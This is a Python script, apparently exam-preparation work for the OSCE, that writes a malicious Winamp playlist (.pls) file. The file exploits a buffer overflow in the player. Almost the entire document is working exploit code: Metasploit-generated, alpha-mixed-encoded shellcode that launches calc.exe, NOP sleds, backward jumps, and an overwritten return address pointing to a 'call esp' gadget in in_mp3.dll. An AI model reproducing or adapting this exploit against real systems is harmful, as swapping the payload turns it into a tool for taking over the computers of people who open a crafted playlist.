
filename=r"C:\Documents and Settings\Admin\Desktop\OSCEPrep\winamp-evil-playlist.pls"

start= "[playlist]\r\nFile1=\\\\";
nop="\x90"*275
#root@bt:~/Desktop# msfpayload windows/exec cmd=calc.exe R > calc.bin
#root@bt:~/Desktop# msfencode -e x86/alpha_mixed -i calc.bin -t c -BufferRegister=EBP
#[*] x86/alpha_mixed succeeded with size 462 (iteration=1)
shellcode=("\x89\xe2\xda\xca\xd9\x72\xf4\x5f\x57\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x39\x6c\x79\x78\x6c\x49\x35\x50\x45\x50\x53\x30\x51\x70\x6b"
"\x39\x58\x65\x74\x71\x5a\x72\x31\x74\x4c\x4b\x36\x32\x30\x30"
"\x6e\x6b\x50\x52\x46\x6c\x6c\x4b\x33\x62\x32\x34\x4c\x4b\x64"
"\x32\x76\x48\x66\x6f\x78\x37\x43\x7a\x55\x76\x35\x61\x69\x6f"
"\x66\x51\x6f\x30\x6e\x4c\x45\x6c\x31\x71\x51\x6c\x55\x52\x46"
"\x4c\x71\x30\x59\x51\x48\x4f\x64\x4d\x57\x71\x7a\x67\x58\x62"
"\x4c\x30\x42\x72\x66\x37\x4c\x4b\x30\x52\x56\x70\x6e\x6b\x31"
"\x52\x55\x6c\x35\x51\x58\x50\x4e\x6b\x43\x70\x50\x78\x6b\x35"
"\x4b\x70\x64\x34\x62\x6a\x53\x31\x78\x50\x46\x30\x4e\x6b\x53"
"\x78\x55\x48\x6e\x6b\x31\x48\x61\x30\x67\x71\x79\x43\x48\x63"
"\x57\x4c\x51\x59\x6e\x6b\x47\x44\x4c\x4b\x37\x71\x58\x56\x44"
"\x71\x4b\x4f\x56\x51\x6f\x30\x4e\x4c\x39\x51\x7a\x6f\x54\x4d"
"\x53\x31\x6a\x67\x44\x78\x49\x70\x33\x45\x49\x64\x77\x73\x43"
"\x4d\x6a\x58\x67\x4b\x61\x6d\x31\x34\x74\x35\x78\x62\x43\x68"
"\x4e\x6b\x72\x78\x57\x54\x57\x71\x4e\x33\x55\x36\x4c\x4b\x74"
"\x4c\x62\x6b\x6c\x4b\x52\x78\x75\x4c\x63\x31\x49\x43\x4c\x4b"
"\x43\x34\x4c\x4b\x56\x61\x48\x50\x4d\x59\x30\x44\x35\x74\x75"
"\x74\x53\x6b\x61\x4b\x51\x71\x30\x59\x50\x5a\x73\x61\x59\x6f"
"\x6b\x50\x50\x58\x63\x6f\x42\x7a\x6e\x6b\x32\x32\x6a\x4b\x4e"
"\x66\x53\x6d\x63\x5a\x55\x51\x6c\x4d\x4c\x45\x4f\x49\x45\x50"
"\x45\x50\x57\x70\x42\x70\x31\x78\x46\x51\x6e\x6b\x70\x6f\x6b"
"\x37\x39\x6f\x69\x45\x6d\x6b\x6c\x30\x48\x35\x4d\x72\x51\x46"
"\x65\x38\x4f\x56\x4e\x75\x4d\x6d\x6d\x4d\x79\x6f\x58\x55\x37"
"\x4c\x53\x36\x43\x4c\x34\x4a\x4f\x70\x59\x6b\x59\x70\x73\x45"
"\x73\x35\x4d\x6b\x51\x57\x37\x63\x42\x52\x62\x4f\x62\x4a\x63"
"\x30\x71\x43\x4b\x4f\x58\x55\x62\x43\x65\x31\x52\x4c\x70\x63"
"\x64\x6e\x53\x55\x44\x38\x45\x35\x77\x70\x41\x41")
nop2="\x90"*(51+68)
longjump="\x90"*5+"\xe9\xa8\xfd\xff\xff"+"\x90"*156
            
eip="\x61\xd9\x02\x02"                      #0x0202d961 : "call esp" |  {PAGE_EXECUTE_READ} [in_mp3.dll]

backjump166="\xe9\x55\xff\xff\xff"+"\x90"*7

end="\r\nTitle1=Pwned by D4v1D\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n";

payload=start+nop+shellcode+nop2+longjump+eip+backjump166+end
print len(payload)-len(start)-len(end)
textfile=open(filename,'w')
textfile.write(payload)
textfile.close()
